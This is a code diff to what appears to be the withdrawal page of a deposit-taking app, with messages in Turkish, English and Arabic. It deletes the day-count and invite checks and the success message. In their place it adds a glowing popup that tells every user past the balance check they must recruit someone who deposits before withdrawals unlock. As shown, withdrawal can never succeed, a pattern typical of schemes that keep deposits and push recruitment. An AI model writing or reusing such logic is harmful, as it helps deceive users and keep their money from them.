@@ -346,41 +346,76 @@
             return showStatus(t.errNoMoney, true);
         }
 
-        // 4. 9 Gün Kontrolü
-        let days = parseInt(userData.days) || 0;
-let remaining = 9 - days;
-
-if(days < 9){
-
-    let msg = "";
-
-    if(lang === "tr"){
-        msg = remaining + " gün tamamlaman gerekiyor";
-    }
-    else if(lang === "en"){
-        msg = "You must complete " + remaining + " days";
-    }
-    else{
-        msg = "\u202Bيجب عليك اكمال " + remaining + " ايام\u202C";
-    }
-
-    return showStatus(msg, true);
-}
-
-        // 5. Davet Kontrolü (9 gün tamamsa buraya geçer)
-        if(!userData.invitedCount || userData.invitedCount < 1) {
-            return showStatus(t.errInvite, true);
-        }
-
-        // Hepsi Tamamsa
-        showStatus(t.success, false);
+        document.getElementById("luxText").innerText = luxMessages[lang];
+document.getElementById("luxPopup").style.display = "flex";
     }
 
     // common.js'den dil fonksiyonunu simüle et (eğer yoksa)
     function getLang() {
         return localStorage.getItem("lang") || "en";
     }
+    const luxMessages = {
+  ar: "لتفعيل السحب، يجب دعوة مستخدم جديد يقوم بعملية إيداع.",
+  tr: "Çekim açılması için kendi davet ettiğin bir kişi yatırım yapmalıdır",
+  en: "You must invite a person who deposits to unlock withdrawals"
+};
+function closeLux(){
+  document.getElementById("luxPopup").style.display = "none";
+}
 </script>
+<div id="luxPopup" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.75);
+justify-content:center;
+align-items:center;
+z-index:9999;
+">
 
+  <div style="
+  background:linear-gradient(145deg,#1e293b,#0f172a);
+  padding:40px 25px;
+  border-radius:25px;
+  text-align:center;
+  max-width:320px;
+  box-shadow:
+    0 0 20px rgba(0,255,200,0.3),
+    0 0 50px rgba(0,255,200,0.2);
+  animation:pop 0.3s ease;
+  ">
+
+    <h3 id="luxText" style="
+    color:#00ffc8;
+    font-size:18px;
+    line-height:1.6;
+    text-shadow:0 0 10px rgba(0,255,200,0.5);
+    ">
+    </h3>
+
+    <div onclick="closeLux()" style="
+    margin-top:20px;
+    padding:12px;
+    background:#00ffc8;
+    color:black;
+    border-radius:10px;
+    cursor:pointer;
+    font-weight:bold;
+    ">
+    OK
+    </div>
+
+  </div>
+</div>
+
+<style>
+@keyframes pop {
+  from {transform:scale(0.7);opacity:0;}
+  to {transform:scale(1);opacity:1;}
+}
+</style>
 </body>
 </html>
